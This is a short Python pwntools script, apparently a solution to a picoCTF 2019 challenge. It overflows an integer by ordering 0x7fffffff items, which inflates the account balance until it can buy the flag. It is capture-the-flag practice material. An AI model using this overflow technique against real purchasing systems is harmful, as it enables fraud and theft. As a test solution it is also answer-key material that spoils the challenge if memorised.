from pwn import *

def main():
    f = remote("2019shell1.picoctf.com", 14937)

    balance = 1100
    while balance < 100000:
        f.sendlineafter("Enter a menu selection", str(2))
        f.sendlineafter("2. 1337 Flag", str(1))
        f.sendlineafter("These knockoff Flags cost 900 each, enter desired quantity", str(0x7fffffff))
        f.readuntil("Your current balance after transaction: ")
        read_data = f.readuntil("\n").decode("utf-8").strip()
        balance = int(read_data)

        log.info("balance: {}".format(balance))

    f.sendlineafter("Enter a menu selection", str(2))
    f.sendlineafter("2. 1337 Flag", str(2))
    f.sendlineafter("Enter 1 to buy one", str(1))

    f.interactive()

